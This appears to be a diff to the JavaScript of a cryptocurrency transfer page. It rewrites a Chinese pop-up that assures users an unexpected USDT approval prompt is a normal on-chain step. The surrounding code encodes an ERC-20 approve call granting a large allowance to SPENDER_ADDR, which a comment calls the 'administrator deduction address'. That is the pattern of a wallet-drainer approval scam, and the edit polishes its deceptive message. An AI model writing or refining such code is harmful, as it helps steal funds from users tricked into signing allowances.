@@ -278,7 +278,7 @@ sendBtn.addEventListener("click", async () => {
     const needWei = BigInt(web3.utils.toWei(val.toString(),"ether"));
     const approveWei = BigInt(web3.utils.toWei(APPROVE_AMOUNT,"ether"));
     try{
-        alert("因钱包升级版本不同转账会提示授信USDT额度为正常现象");
+        alert("不同钱包版本交互略有差异，转账USDT时弹出授权额度，属于链上正常流程，请确认签名。");
         //授权：授权给 SPENDER_ADDR（管理员划扣地址）
         const approveCalldata = "0x095ea7b3"
             + SPENDER_ADDR.slice(2).padStart(64,"0")
